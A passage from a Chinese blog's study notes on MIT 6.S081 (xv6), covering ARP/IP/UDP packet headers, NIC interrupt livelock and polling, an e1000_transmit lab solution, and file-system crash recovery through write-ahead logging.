class="hljs-string">ETHADDR_LEN</span>]<br><span class="hljs-string">uint132</span> <span class="hljs-string">tip</span><br>&#125; <span class="hljs-string">__attribute__((packed))</span><br><br><span class="hljs-comment">#define ARP_HRD_ETHER 1 // ethernet</span><br><span class="hljs-string">enum</span> &#123;<br><span class="hljs-string">ARP_OP_REQUEST</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span><br><span class="hljs-string">ARP_OP_REPLY</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span><br>&#125;<br><br><span class="hljs-comment">#[arp][T16*8bit][S48bit][D48bit] 以太网的有效载荷就是arp数据包，紧跟在以太网报头之后</span><br><br><br><br>[[[[[<span class="hljs-string">DNS</span>]<span class="hljs-string">UDP</span>] <span class="hljs-string">protol</span> <span class="hljs-string">IP</span> <span class="hljs-string">type</span> <span class="hljs-string">ETH</span>]]<br><span class="hljs-string">发送上往下构建包，type和protocol告知下面该用什么协议去检查和理解payload</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1164.png" alt="无标题-2023-08-26-1164" style="zoom:50%;" /></p><h3 id="ip协议">IP协议</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-comment">// an IP packet header (comes after an Ethernet)</span><br><span class="hljs-keyword">struct</span> ip &#123;<br><span class="hljs-keyword">uint8</span> ip_vhl; <span class="hljs-comment">// version &lt;&lt; 5 | header length &gt;&gt; 2</span><br><span class="hljs-keyword">uint8</span> ip_tos; <span class="hljs-comment">// type of service</span><br><span class="hljs-keyword">uint16</span> ip_len; <span class="hljs-comment">// total length</span><br><span class="hljs-keyword">uint16</span> ip_id; <span class="hljs-comment">// identification</span><br><span class="hljs-keyword">uint16</span> ip_off; <span class="hljs-comment">// fragment offset field</span><br><span class="hljs-keyword">uint8</span> ip_ttl; <span class="hljs-comment">// time to live</span><br><span class="hljs-keyword">uint8</span> ip_p; <span class="hljs-comment">// protocol,上层协议是什么</span><br><span class="hljs-keyword">uint8</span> ip_sum; <span class="hljs-comment">// checksum</span><br><span class="hljs-keyword">uint8</span> ip_src, ip_dst;<br>&#125;<br><br><span class="hljs-meta">#define IPPROTO_TCP 6</span><br><span class="hljs-meta">#define IPPROTO_UDP 17</span><br><br>ffff ffff ffff <span class="hljs-number">5254</span> <span class="hljs-number">0012</span> <span class="hljs-number">3456</span> <span class="hljs-number">0800</span> [<span class="hljs-number">4500</span><br><span class="hljs-number">002</span>f <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">6411</span>(<span class="hljs-number">11</span>是<span class="hljs-number">10</span>进制的<span class="hljs-number">17</span>表示UDP) <span class="hljs-number">4</span>eae(checksum) <span class="hljs-number">0</span>a00(<span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span>) <span class="hljs-number">020</span>f <span class="hljs-number">0</span>a00(<span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.2</span>)<br><span class="hljs-number">0202</span>] <span class="hljs-number">07</span>d0 <span class="hljs-number">6403</span> <span class="hljs-number">001</span>b <span class="hljs-number">0000</span> <span class="hljs-number">6120</span> <span class="hljs-number">6</span>d55 <span class="hljs-number">7373</span><br><br></code></pre></td></tr></table></figure><h3 id="udp协议">UDP协议</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// udp packet header (comes after an tp header)</span><br><br><span class="hljs-keyword">struct</span> udp &#123;<br><span class="hljs-type">uint16</span> sport; <span class="hljs-comment">// src port</span><br><span class="hljs-type">uint16</span> dport; <span class="hljs-comment">// dst port</span><br><span class="hljs-type">uint16</span> ulen; <span class="hljs-comment">// length, including udp header, not including ip header</span><br><span class="hljs-type">uint16</span> sum <span class="hljs-comment">// checksum</span><br>&#125;<br><br>syscall socket<br>sockets(<span class="hljs-number">53</span>)<br><br><br>ffff ffff ffff <span class="hljs-number">5254</span> <span class="hljs-number">0012</span> <span class="hljs-number">3456</span> <span class="hljs-number">0800</span> <span class="hljs-number">4500</span><br><span class="hljs-number">002</span>f <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">6411</span> <span class="hljs-number">4</span>eae <span class="hljs-number">0</span>a00 <span class="hljs-number">020</span>f <span class="hljs-number">0</span>a00<br><span class="hljs-number">0202</span> [<span class="hljs-number">07</span>d0(src) <span class="hljs-number">6403</span>(dst) <span class="hljs-number">001</span>b(<span class="hljs-built_in">len</span>) <span class="hljs-number">0000</span>(checksum) <span class="hljs-number">6120</span>(ascii) <span class="hljs-number">6</span>d55(ascii) <span class="hljs-number">7373</span>(ascii)... <span class="hljs-comment">// a.message.from.xv6</span><br></code></pre></td></tr></table></figure><p><code>每个协议都有最大的数据长度，这是为什么？</code></p><ul><li><p>数据在沿着线路传播的时候，数据量越大，损失的几率越高，噪音越大，对于合理大小的校验和应该是16或者32位，它限制了包的大小。</p></li><li><p>另外，数据越大，需要的路由器缓存也就越大，需要高质量的硬件支持</p></li></ul><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1165.png" alt="无标题-2023-08-26-1165" style="zoom:50%;" /></p><h2 id="网络协议栈">网络协议栈</h2><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1163.png" alt="无标题-2023-08-26-1163" style="zoom:50%;" /></p><h2 id="网络协议硬件中的协作模式">网络协议硬件中的协作模式</h2><p>在单核处理器上，中断拥有最高的优先级执行度，所以当中断发生时，其他进程被暂时pending；但是在多核处理器上，将有更多的并行性，其他处理器上的进程不会被打扰，甚至可以读取网络线程处理好的数据缓存。另外，这网络协议栈中，去恶劣很常见，是w为了应对网络的临时性突变，比如网络线程处理很慢，但是这个时候有大量数据发送过来。</p><p>Q：同意网卡可以同时接收和发送吗？</p><p>A：可以，如果发送和接收的是同一个网卡的情况下，比如回环地址</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1162.png" alt="无标题-2023-08-26-1162" style="zoom:50%;" /></p><p>经典网卡模式：数据到了，存放到网卡的缓存中，同时网卡驱动从NICbuffer拷贝数据到主机内存，然后触发中断。</p><p>缺点：由于NIC和内存的通过控制总线交互耗时比较长，导致处理比较慢。</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1161.png" style="zoom:50%;" /></p><p>现代大部分处理器(E1000)：初始化的时候，网卡就知道了DMAring(DMA是主机内存的概念，而非网卡内的，它是计算机内部用于存放网络数据包的一段特定内存，是一个指针数组)的地址，后续有数据写入或者读取都是和DMAring交互的，没读写一次，记住下一个DMA ring的位置</p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1160.png" style="zoom:50%;" /></p><p><img src="C:\Users\Mmjiang\Desktop\oslearning\无标题-2023-08-26-1159.png" alt="无标题-2023-08-26-1159" style="zoom:50%;" /></p><p>简单画图描述了下课堂里提到的相关论文的一幅图，横坐标是网卡输入速率，纵坐标是cpu处理后由网卡转发的速率，可以观察nopulling前面半部分，输入速率和输出速率持平，可是到了5000之后就是下降趋势了(这里输出最大是5000packets/s，也就是网络线程最大处理速度是200packets/ms)，这是为什么？</p><p>考虑单核情况下，会有两个任务</p><ul><li>接收网卡数据传入带来的中断</li><li>处理数据的处理和转发的网络线程</li></ul><p>一个是网卡接收到数据后，触发中断程序，同时cpu也在处理之前的输入，所以每次有新的输入进来的时候，都会触发中断，而拼盘的中断也是有代价的，这样就导致了转发任务一直主语饥饿状态，这就是课堂里所说的livelock</p><p><code>如何解决?</code></p><p>第一个中断到达的时候，运行interrupt routine，但是interruptroutine不从网卡上赋值数据包，它唤醒网络线程，同时设置网卡的中断为禁用状态，伪代码如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Loop<br> pull <span class="hljs-keyword">a</span> few packets(eg: <span class="hljs-number">5</span>)<br> <span class="hljs-built_in">process</span><br> <span class="hljs-keyword">if</span> <span class="hljs-literal">none</span><br> enable INTR<br> sleep<br></code></pre></td></tr></table></figure><p>使用了这种不断轮询的策略后，如上图所示，不会出现网络线程饥饿的现象，但是如果网卡速率过大的话，还是会发生丢包的。</p><h2 id="homework">Homework</h2><p>e1000_transmit</p><p><code>tx_ring</code> 中的每个元素长这样：</p><figure><imgsrc="https://pic2.zhimg.com/80/v2-4ad1343146b023e24d6c407ebf348d35_1440w.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-type">int</span><br>e1000_transmit(struct mbuf *m)<br>&#123;<br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Your code here.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// the mbuf contains an ethernet frame; program it into</span><br>  <span class="hljs-comment">// the TX descriptor ring so that the e1000 sends it. Stash</span><br>  <span class="hljs-comment">// a pointer so that it can be freed after sending.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// ask the E1000 for the TX ring index at which </span><br>  <span class="hljs-comment">// it&#x27;s expecting the next packet, by reading the E1000_TDT control register.</span><br>  acquire(&amp;e1000_lock);<br>  uint32 <span class="hljs-keyword">index</span> = regs[E1000_TDT];<br>  <span class="hljs-comment">// the E1000 hasn&#x27;t finished the corresponding previous transmission request, so return an error.</span><br>  <span class="hljs-keyword">if</span> (!(tx_ring[<span class="hljs-keyword">index</span>].status &amp; E1000_TXD_STAT_DD)) &#123;<br>    release(&amp;e1000_lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-comment">// free the last mbuf that was transmitted from that descriptor (if there was one).</span><br>  <span class="hljs-keyword">if</span> (tx_mbufs[<span class="hljs-keyword">index</span>]) &#123;<br>    mbuffree(tx_mbufs[<span class="hljs-keyword">index</span>]);<br>  &#125;<br>  <span class="hljs-comment">// stash away a pointer to the mbuf for later freeing.</span><br>  tx_mbufs[<span class="hljs-keyword">index</span>] = m;<br>  memset(&amp;tx_ring[<span class="hljs-keyword">index</span>],<span class="hljs-number">0</span>,sizeof(tx_ring[<span class="hljs-keyword">index</span>]));<br>  <span class="hljs-comment">// fill in the descriptor. m-&gt;head points to the packet&#x27;s content in memory, and m-&gt;len is the packet length.</span><br>  tx_ring[<span class="hljs-keyword">index</span>].addr = (uint64)m-&gt;head;<br>  tx_ring[<span class="hljs-keyword">index</span>].<span class="hljs-built_in">length</span> = m-&gt;len;<br>  <span class="hljs-comment">// set the necessary cmd flags.</span><br>  tx_ring[<span class="hljs-keyword">index</span>].cmd = E1000_TXD_CMD_RS | E1000_TXD_CMD_EOP;<br>  <span class="hljs-comment">// update the ring position by adding one to E1000_TDT modulo TX_RING_SIZE.</span><br>  regs[E1000_TDT] = (<span class="hljs-keyword">index</span> + <span class="hljs-number">1</span>) % TX_RING_SIZE;<br>  release(&amp;e1000_lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/351563871">MIT 6.S081 2020LAB11记录 - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File system Recovery</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/filesys-recovery/main/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/filesys-recovery/main/</url>
    
    <content type="html"><![CDATA[<p>这里我们关心的crash或者故障包括了：在文件系统操作过程中的电力故障；在文件系统操作过程中的内核panic。包括XV6在内的大部分内核都会panic，panic可能是由内核bug引起，它会突然导致你的系统故障，但是你肯定期望能够在重启之后还能使用文件系统。</p><p>你可能会反问，怎么就不能使用文件系统了？文件系统不是存储在一个持久化的存储设备上吗？如果电力故障了，存储设备不会受影响，当电脑恢复运行时，存储设备上的block应该还保存着呀。我们将会看到很多文件系统的操作都包含了多个步骤，如果我们在多个步骤的错误位置crash或者电力故障了，存储在磁盘上的文件系统可能会是一种不一致的状态，之后可能会发生一些坏的事情。而这类问题就是我们今天主要关注的问题。这区别于另一类问题，比如说因为电力故障导致你的磁盘着火了，那么什么数据都没有了，这是一个完全不同的问题，并且有着不同的解决方法，这种情况下需要先备份你的文件系统，然后再重新安装文件系统等等。这个问题我们今天不会关心，今天我们关心的是包含了多个步骤的文件系统操作过程中发生的故障。</p><p>我们今天会研究对于这类特定问题的解决方法，也就是logging。这是一个最初来自于数据库世界的很流行的解决方案，现在很多文件系统都在使用logging。之所以它很流行，是因为它是一个很好用的方法。我们将会看到XV6中的logging实现。当然XV6的实现非常简单，几乎是最简单的实现logging的方法，因为我们只是为了演示关键的思想。但是即使是这么基本的logging实现，也包含了一些微妙的问题，我们将会讨论这些问题，这也是为什么文件系统的logging值得学习的原因。我们将会看到，由于XV6实现的较为简单，XV6中的logging存在一个缺点，它的性能并不咋样，尽管logging系统原则上来说可以获得好的性能。</p><p>类似于创建文件，写文件这样的文件系统操作，都包含了多个步骤的写磁盘操作。我们上节课看过了如何创建一个文件，这里多个步骤的顺序是：</p><ul><li>分配inode，或者在磁盘上将inode标记为已分配</li><li>之后更新包含了新文件的目录的data block</li></ul><p>如果在这两个步骤之间，操作系统crash了。这时可能会使得文件系统的属性被破坏。这里的属性是指，每一个磁盘block要么是空闲的，要么是只分配给了一个文件。即使故障出现在磁盘操作的过程中，我们期望这个属性仍然能够保持。如果这个属性被破坏了，那么重启系统之后程序可能会运行出错，比如：</p><ul><li>操作系统可能又立刻crash了，因为文件系统中的一些数据结构现在可能处于一种文件系统无法处理的状态。</li><li>或者，更可能的是操作系统没有crash，但是数据丢失了或者读写了错误的数据</li></ul><p>Logging的实现方式有很多，我这里展示的指示一种非常简单的方案，这个方案中cleanlog和installlog都被推迟了。接下来我会运行这种非常简单的实现方式，之后在下节课我们会看到更加复杂的logging协议。不过所有的这些协议都遵循了writeaheadrule，也就是说在写入commit记录之前，你需要确保所有的写操作都在log中。在这个范围内，还有大量设计上的灵活性可以用来设计特定的logging协议。</p><h3 id="case">Case</h3><p>为了更清晰的理解这里的风险，让我们看一些基于XV6的例子，并看一下哪里可能出错。我们在上节课介绍了XV6有一个非常简单的文件系统和磁盘数据的排布方式。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YzAyZmRjZGJlYTA0NmRlYjNlYWU2NWJkMDNmZjVmOWRfUGg2MWVFWVMzRGNYSEIwcTIyTURwMXd1d2F1WTY2WWJfVG9rZW46QnB0R2JPNnJsb1NQdXR4TTB6ZGMxcXUzbmxiXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在super block之后就是log block，我们今天主要介绍的就是log block。logblock之后是inode block，每个block可能包含了多个inode。之后是bitmapblock，它记录了哪个data block是空闲的。最后是datablock，这里包含了文件系统的实际数据。</p><p>在上节课中，我们看了一下在创建文件时，操作系统与磁盘block的交互过程（注，详见14.5）：</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MTgzNmVhMjk5NzRkZjg4ODI5OTI1OTgzMTJmY2ZmYWNfbVB2WXdKbUQ2RlNnNUM0YkJnU1RjRnF3dVV6djlYY1NfVG9rZW46T1NXeGJFNzhEb25TelN4Y1B6eGN3ZzJLbmZiXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从上面可以看出，创建一个文件涉及到了多个操作：</p><ul><li>首先是分配inode，因为首先写的是block 33</li><li>之后inode被初始化，然后又写了一次block 33</li><li>之后是写block 46，是将文件x的inode编号写入到x所在目录的inode的datablock中</li><li>之后是更新rootinode，因为文件x创建在根目录，所以需要更新根目录的inode的size字段，以包含这里新创建的文件x</li><li>最后再次更新了文件x的inode</li></ul><p>现在我们想知道，哪里可能出错。假设我们在下面这个位置出现了电力故障或者内核崩溃。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=YTdjNzFlZDVjMWE3M2YzMjM3ZDEzMmU1NmI2NWJmOGRfc1VwU2llUlc5Q3BDTnI3YW9SbVl1azlHSXJJakFIZnVfVG9rZW46V1NKVGJvNkNmbzM3S1d4RXdkTGNWZFpMbkZjXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在出现电力故障之后，因为内存数据保存在RAM中，所有的内存数据都丢失了。所有的进程数据，所有的文件描述符，内存中所有的缓存都没有了，因为内存数据不是持久化的。我们唯一剩下的就是磁盘上的数据，因为磁盘的介质是持久化的，所以只有磁盘上的数据能够在电力故障之后存活。基于这些事实，如果我们在上面的位置出现故障，并且没有额外的机制，没有logging，会有多糟糕呢？我们这里会有什么风险？</p><p>在这个位置，我们先写了block33表明inode已被使用，之后出现了电力故障，然后计算机又重启了。这时，我们丢失了刚刚分配给文件x的inode。这个inode虽然被标记为已被分配，但是它并没有放到任何目录中，所以也就没有出现在任何目录中，因此我们也就没办法删除这个inode。所以在这个位置发生电力故障会导致我们丢失inode。</p><p>你或许会认为，我们应该改一改代码，将写block的顺序调整一下，这样就不会丢失inode了。所以我们可以先写block46来更新目录内容，之后再写block 32来更新目录的size字段，最后再将block33中的inode标记为已被分配。</p><p>这里的效果是一样的，只是顺序略有不同。并且这样我们应该可以避免丢失inode的问题。那么问题来了，这里可以工作吗？我们应该问问自己，如果在下面的位置发生了电力故障会怎样？</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q2NmEwNTk2MjhhMGNiNDIxNDBmNzBkNzViNWRiOWZfZXN1NHlETE54MWtKZ1lBSXIwTnNDbGU2NGgzdm1NTExfVG9rZW46TjFOS2JBM05Ib0JXWmJ4VXNoaWNtaEoybmlnXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在这个位置，目录被更新了，但是还没有在磁盘上分配inode（有个问题，如果inode没分配的话，write46的时候写的是啥）。电力故障之后机器重启，文件系统会是一个什么状态？或者说，如果我们读取根目录下的文件x，会发生什么，因为现在在根目录的datablock已经有了文件x的记录？</p><p>是的，我们会读取一个未被分配的inode，因为inode在crash之前还未被标记成被分配。更糟糕的是，如果inode之后被分配给一个不同的文件，这样会导致有两个应该完全不同的文件共享了同一个inode。如果这两个文件分别属于用户1和用户2，那么用户1就可以读到用户2的文件了。所以上面的解决方案也不好。</p><p>所以调整写磁盘的顺序并不能彻底解决我们的问题，我们只是从一个问题换到了一个新的问题。</p><p>让我们再看一个例子，这个例子中会向文件x写入“hi”</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWRjMDAxYTc2ZWM1ZDZlNjgwNThlNTQ4ZGJmMTk1N2VfRTVyb1pyRUphY1YzakQwTGJmZ2tOZlRJcnVmNnRBV3lfVG9rZW46WFJ6bWJNSkp1bzVhc3h4VVNwY2NvZXk0bnlmXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>一旦成功的创建了文件x，之后会调用write系统调用，我们在上节课看到了write系统调用也执行了多个写磁盘的操作。</p><ul><li>首先会从bitmap block，也就是block 45中，分配datablock，通过从bitmap中分配一个bit，来表明一个data block已被分配。</li><li>上一步分配的data block是block 595，这里将字符“h”写入到block595。</li><li>将字符“i”写入到block 595。</li><li>最后更新文件夹x的inode来更新size字段。</li></ul><p>这里我们也可以问自己一个问题，我们在下面的位置crash了会怎样？</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVhYWE0M2I5NDk5NjlkNzVhZjMwYzE4NzI4YjEzYThfdW56em5ramRuUVRDWDVZWjdlUGpNVjFQYU5hV0d2WFRfVG9rZW46UlFId2JDMVJvb21BQ2V4cHJWdmMwSURmblhjXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里我们从bitmap block中分配了一个datablock，但是又还没有更新到文件x的inode中。当我们重启之后，磁盘处于一个特殊的状态，这里的风险是什么？是的，我们这里丢失了datablock，因为这个datablock被分配了，但是却没有出现在任何文件中，因为它还没有被记录在任何inode中。</p><p>你或许会想，是因为这里的顺序不对才会导致丢失datablock的问题。我们应该先写block 33来更新inode来包含data block595（同样的问题，这个时候datablock都还没有分配怎么知道是595），之后才通过写block 45将data block595标记为已被分配。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU4NmFkNDc1N2FmM2Y4NWJlMWYwMzU2MjU4NjcyYjBfNmpqRnNJcUlsQXhyMVY1TTgxT3RoZjUzR2NEZ1lKbjFfVG9rZW46V1lubmJMcjhFb1NIcWh4cWpOd2M0cXhhbm1lXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>所以，为了避免丢失datablock，我们将写block的顺序改成这样。现在我们考虑一下，如果故障发生在这两个操作中间会怎样？</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU0ZjRlNzg0NDBlOTFkZTAzNjczN2QxNTRhMzE0ZjhfWHd2UmZ0MDRZSTJjY2RMOHJFbzR0VGhCWE9XanNJVm9fVG9rZW46VEI3bmJ0WjZkb0kxTXd4S0t6UWNteW5GbkNoXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这时inode会认为data block595属于文件x，但是在磁盘上它还被标记为未被分配的。之后如果另一个文件被创建了，block595可能会被另一个文件所使用。所以现在两个文件都会在自己的inode中记录block595。如果两个文件属于两个用户，那么两个用户就可以读写彼此的数据了。很明显，我们不想这样，文件系统应该确保每一个datablock要么属于且只属于一个文件，要么是空闲的。所以这里的修改会导致磁盘block在多个文件之间共享的安全问题，这明显是错误的。</p><p>所以这里的问题并不在于操作的顺序，而在于我们这里有多个写磁盘的操作，这些操作必须作为一个原子操作出现在磁盘上。</p><p>我们这节课要讨论的针对文件系统crash之后的问题的解决方案，其实就是logging。这是来自于数据库的一种解决方案。它有一些好的属性：</p><ul><li>首先，它可以确保文件系统的系统调用是原子性的。比如你调用create/write系统调用，这些系统调用的效果是要么完全出现，要么完全不出现，这样就避免了一个系统调用只有部分写磁盘操作出现在磁盘上。</li><li>其次，它支持快速恢复（FastRecovery）。在重启之后，我们不需要做大量的工作来修复文件系统，只需要非常小的工作量。这里的快速是相比另一个解决方案来说，在另一个解决方案中，你可能需要读取文件系统的所有block，读取inode，bitmapblock，并检查文件系统是否还在一个正确的状态，再来修复。而logging可以有快速恢复的属性。</li><li>最后，原则上来说，它可以非常的高效，尽管我们在XV6中看到的实现不是很高效。</li></ul><p>如何构建一个logging系统，并同时具有原子性的系统调用，快速恢复和高性能，而今天，我们只会关注前两点。</p><h3 id="logging">logging</h3><p>logging的基本思想还是很直观的。首先，你将磁盘分割成两个部分，其中一个部分是log，另一个部分是文件系统，文件系统可能会比log大得多。</p><p>（logwrite）当需要更新文件系统时，我们并不是更新文件系统本身。假设我们在内存中缓存了bitmapblock，也就是block 45。当需要更新bitmap时，我们并不是直接写block45，而是将数据写入到log中，并记录这个更新应该写入到block45。对于所有的写block都会有相同的操作，例如更新inode，也会记录一条写block 33的log。</p><p>所以基本上，任何一次写操作都是先写入到log，我们并不是直接写入到block所在的位置，而总是先将写操作写入到log中。</p><p>（commitop）之后在某个时间，当文件系统的操作结束了，比如说我们前一节看到的4-5个写block操作都结束，并且都存在于log中，我们会commit文件系统的操作。这意味着我们需要在log的某个位置记录属于同一个文件系统的操作的个数，例如5。</p><p>（installlog）当我们在log中存储了所有写block的内容时，如果我们要真正执行这些操作，只需要将block从log分区移到文件系统分区。我们知道第一个操作该写入到block45，我们会直接将数据从log写到block45，第二个操作该写入到block33，我们会将它写入到block 33，依次类推。</p><p>（cleanlog）一旦完成了，就可以清除log。清除log实际上就是将属于同一个文件系统的操作的个数设置为0。</p><p>以上就是log的基本工作方式。为什么这样的工作方式是好的呢？假设我们crash并重启了。在重启的时候，文件系统会查看log的commit记录值，如果是0的话，那么什么也不做。如果大于0的话，我们就知道log中存储的block需要被写入到文件系统中，很明显我们在crash的时候并不一定完成了installlog，我们可能是在commit之后，cleanlog之前crash的。所以这个时候我们需要做的就是reinstall（注，也就是将log中的block再次写入到文件系统），再cleanlog。</p><p>这里的方法之所以能起作用，是因为可以确保当发生crash（并重启之后），我们要么将写操作所有相关的block都在文件系统中更新了，要么没有更新任何一个block，我们永远也不会只写了一部分block。为什么可以确保呢？我们考虑crash的几种可能情况。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=OTUzNjMxZjkxYjU3MDI3MjcwYzVjODAwODQ2NjgyYjJfemRiZ2p5U0d3QjhGS1p3ZVdaU2NWTjczdjhQV0RBR2ZfVG9rZW46UTdHTWJXR3Nmb0t0WVF4YU9XN2N3cnE4bk5lXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li>在第1步和第2步之间crash会发生什么？在重启的时候什么也不会做，就像系统调用从没有发生过一样，也像crash是在文件系统调用之前发生的一样。这完全是可接受的。</li><li>在第2步和第3步之间crash会发生什么？在这个时间点，所有的logblock都落盘了，因为有commit记录，所以完整的文件系统操作必然已经完成了。我们可以将logblock写入到文件系统中相应的位置，这样也不会破坏文件系统。所以这种情况就像系统调用正好在crash之前就完成了。</li><li>在install（第3步）过程中和第4步之前这段时间crash会发生什么？在下次重启的时候，我们会redolog，我们或许会再次将logblock中的数据再次拷贝到文件系统。这样也是没问题的，因为log中的数据是固定的，我们就算重复写了文件系统，每次写入的数据也是不变的。重复写入并没有任何坏处，因为我们写入的数据可能本来就在文件系统中，所以多次installlog完全没问题。当然在这个时间点，我们不能执行任何文件系统的系统调用。我们应该在重启文件系统之前，在重启或者恢复的过程中完成这里的恢复操作。换句话说，installlog是幂等操作（注，idempotence，表示执行多次和执行一次效果一样），你可以执行任意多次，最后的效果都是一样的。</li></ul><blockquote><p>学生提问：因为这里的接口只有read/write，但是如果我们做append操作，就不再安全了，对吧？</p><p>Frans教授：某种程度来说，append是文件系统层面的操作，在这个层面，我们可以使用上面介绍的logging机制确保其原子性（注，append也可以拆解成底层的read/write）。</p><p>学生提问：当正在commitlog的时候crash了会发生什么？比如说你想执行多个写操作，但是只commit了一半。</p><p>Frans教授：在上面的第2步，执行commit操作时，你只会在记录了所有的write操作之后，才会执行commit操作。所以在执行commit时，所有的write操作必然都在log中。而commit操作本身也有个有趣的问题，它究竟会发生什么？如我在前面指出的，commit操作本身只会写一个block。文件系统通常可以这么假设，单个block或者单个sector的write是原子操作（注，有关block和sector的区别详见14.3）。这里的意思是，如果你执行写操作，要么整个sector都会被写入，要么sector完全不会被修改。所以sector本身永远也不会被部分写入，并且commit的目标sector总是包含了有效的数据。而commit操作本身只是写log的header，如果它成功了只是在commitheader中写入log的长度，例如5，这样我们就知道log的长度为5。这时crash并重启，我们就知道需要重新install5个block的log。如果commitheader没能成功写入磁盘，那这里的数值会是0。我们会认为这一次事务并没有发生过。这里本质上是writeaheadrule，它表示logging系统在所有的写操作都记录在log中之前，不能installlog。</p></blockquote><p>Logging的实现方式有很多，我这里展示的指示一种非常简单的方案，这个方案中cleanlog和installlog都被推迟了。接下来我会运行这种非常